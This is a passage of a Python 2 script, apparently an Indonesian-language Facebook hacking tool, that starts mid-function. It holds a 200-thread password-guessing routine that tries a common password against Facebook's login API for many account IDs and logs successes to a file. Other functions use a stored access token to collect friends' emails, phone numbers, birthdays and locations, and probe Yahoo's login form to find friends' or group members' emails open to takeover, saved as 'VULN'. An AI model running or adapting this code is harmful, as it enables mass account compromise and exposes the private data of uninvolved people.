                                                else:
                                                    pass6 = 'Sayang'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBERHASIL'
                                                        print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                                                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                                                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
                                                        oks.append(user + pass6)
                                                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;92mBERHASIL'
                                                            print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                                                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                                                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
                                                            cek = open('out/super_cp.txt', 'a')
                                                            cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                                            cek.close()
                                                            cekpoint.append(user + pass6)
        except:
            pass

    p = ThreadPool(200)
    p.map(main, id)
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;96m[+] \x1b[1;92mCP File tersimpan \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    super()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    try:
        uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
        gud = json.loads(uh.text)
        for p in gud['data']:
            nama = p['name']
            id = p['id']
            f = open('out/Grupid.txt', 'w')
            listgrup.append(id)
            f.write(id + '\n')
            print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mGROUP SAYA'
            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID  \x1b[1;91m: \x1b[1;92m' + str(id)
            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama\x1b[1;91m: \x1b[1;92m' + str(nama) + '\n'

        print 42 * '\x1b[1;96m='
        print '\x1b[1;96m[+] \x1b[1;92mTotal Group \x1b[1;91m:\x1b[1;97m %s' % len(listgrup)
        print '\x1b[1;96m[+] \x1b[1;92mTersimpan \x1b[1;91m: \x1b[1;97mout/Grupid.txt'
        f.close()
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;96m[!] \x1b[1;91mTerhenti'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()
    except KeyError:
        os.remove('out/Grupid.txt')
        print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;91mTidak ada koneksi'
        keluar()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mError'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    aid = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID/Nama\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mTunggu sebentar \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for i in cok['data']:
        if aid in i['name'] or aid in i['id']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            print 43 * '\x1b[1;96m='
            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mNama\x1b[1;97m          : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mID\x1b[1;97m            : ' + z['id']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mID\x1b[1;97m            : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mEmail\x1b[1;97m         : ' + z['email']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mNo HP\x1b[1;97m         : ' + z['mobile_phone']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mNo HP\x1b[1;97m         : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mTempat tinggal\x1b[1;97m: ' + z['location']['name']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mTempat tinggal\x1b[1;97m: \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mTanggal lahir\x1b[1;97m : ' + z['birthday']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mTanggal lahir\x1b[1;97m : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mSekolah\x1b[1;97m       : '
                for q in z['education']:
                    try:
                        print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                    except KeyError:
                        print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'

            except KeyError:
                pass

            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
    else:
        print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;91mAkun tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()


def yahoo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    print '\x1b[1;97m1.\x1b[1;93m Clone dari daftar teman'
    print '\x1b[1;97m2.\x1b[1;93m Clone dari teman'
    print '\x1b[1;97m3.\x1b[1;93m Clone dari member group'
    print '\x1b[1;97m4.\x1b[1;93m Clone dari file'
    print '\n\x1b[1;91m0.\x1b[1;91m Kembali'
    clone()


def clone():
    embuh = raw_input('\n\x1b[1;97m >>> ')
    if embuh == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
    else:
        if embuh == '1':
            clone_dari_daftar_teman()
        else:
            if embuh == '2':
                clone_dari_teman()
            else:
                if embuh == '3':
                    clone_dari_member_group()
                else:
                    if embuh == '4':
                        clone_dari_file()
                    else:
                        if embuh == '0':
                            menu()
                        else:
                            print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'


def clone_dari_daftar_teman():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 42 * '\x1b[1;96m='
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama + '\n'
                    save = open('out/MailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_teman():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 42 * '\x1b[1;96m='
    idt = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama\x1b[1;91m :\x1b[1;97m ' + op['name']
    except KeyError:
        print '\x1b[1;96m[!] \x1b[1;91mTeman tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 43 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama
                    save = open('out/TemanMailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/TemanMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_member_group():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 42 * '\x1b[1;96m='
    id = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
        asw = json.loads(r.text)
        print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
    except KeyError:
        print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama
                    save = open('out/GrupMailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/GrupMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_file():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    files = raw_input('\x1b[1;96m[+] \x1b[1;93mNama File \x1b[1;91m: \x1b[1;97m')
    try:
        total = open(files, 'r')
        mail = total.readlines()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()

    mpsh = []
    jml = 0
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                save = open('out/MailVuln.txt', 'a')
                save.write('Email: ' + mail + '\n\n')
                save.close()
                berhasil.append(mail)

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile Tersimpan \x1b[1;91m:\x1b[1;97m out/FileMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


if __name__ == '__main__':
    siapa()